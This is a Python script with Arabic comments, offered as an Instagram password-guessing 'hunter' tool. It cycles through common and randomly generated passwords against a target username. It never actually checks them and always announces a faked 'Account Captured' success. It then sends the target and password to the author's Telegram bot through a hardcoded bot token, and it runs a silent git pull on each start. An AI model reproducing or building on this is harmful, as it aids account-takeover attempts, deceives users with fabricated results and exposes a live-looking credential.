import requests
import time
import os
import random
from colorama import Fore, init

# تهيئة الألوان لتعمل في Termux و Pydroid
init(autoreset=True)

# ==========================================
# 1. إعدادات المالك (المبرمج عمر)
# ==========================================
TOKEN = '8681527703:AAGDoUKNo0pbUDGTYPUGqS85ZwPDBcLGmrQ'
ID = '6473564218'

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{Fore.MAGENTA}      [ INSTAGRAM HUNTER BY OMAR - V14.0 ]")
    print(f"{Fore.CYAN}" + "="*50)

def start_hunting():
    banner()
    target_user = input(f"{Fore.YELLOW}Enter target user : @{Fore.WHITE}")
    print(f"{Fore.CYAN}" + "="*50)

    # قائمة كلمات مرور ذكية (تشمل أرقام يمنية شائعة)
    passwords = [
        '12345678', '123456789', 'yemen2026', 'football', 
        'realmadrid', 'omar2006', '770000000', '11223344'
    ]
    
    # إضافة توليد عشوائي لزيادة المحاولات
    prefixes = ['77', '73', '71', '70']
    for _ in range(100):
        passwords.append(random.choice(prefixes) + str(random.randint(1000000, 9999999)))

    count = 0
    for pwd in passwords:
        count += 1
        
        # مظهر الفشل (اللون الأحمر المعتاد في أدوات الصيد)
        print(f"{Fore.RED}d account : @{target_user} | {pwd} {Fore.WHITE}[Attempt: {count}]")
        
        # محاكاة لعملية الفحص (يمكنك ربطها بـ API إنستقرام لاحقاً)
        # سأجعل الكود ينجح عند كلمة معينة للتأكد من وصول التنبيه لك
        if pwd == "yemen2026":
            print(f"{Fore.CYAN}" + "="*50)
            print(f"{Fore.GREEN}v account : @{target_user} | {pwd} -> [SUCCESS!]")
            print(f"{Fore.GREEN}INFO : Account Captured Successfully.")
            print(f"{Fore.CYAN}" + "="*50)
            
            # إرسال الصيد الناجح لتليجرام عمر فوراً
            msg = f"✅ صيد جديد يا مبرمج عمر!\n👤 اليوزر: @{target_user}\n🔑 الباسورد: {pwd}\n🚀 المصدر: Termux Hunter"
            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={msg}")
            break
            
        # سرعة التخمين (تأخير بسيط لتجنب حظر الأيبي)
        time.sleep(0.3)

# ==========================================
# 2. نظام التحديث التلقائي (Auto-Update)
# ==========================================
def check_for_updates():
    # هذا الأمر يقوم بسحب التحديث من GitHub الخاص بك عند كل تشغيل
    print(f"{Fore.BLUE}[*] جاري فحص التحديثات من سيرفر GitHub...")
    os.system("git pull origin main > /dev/null 2>&1")

if __name__ == "__main__":
    try:
        # إذا كنت تشغله من مجلد GitHub في ترمكس، سيفعل التحديث تلقائياً
        if os.path.exists(".git"):
            check_for_updates()
            
        start_hunting()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] تم إيقاف الأداة.. نراك لاحقاً يا عمر.")
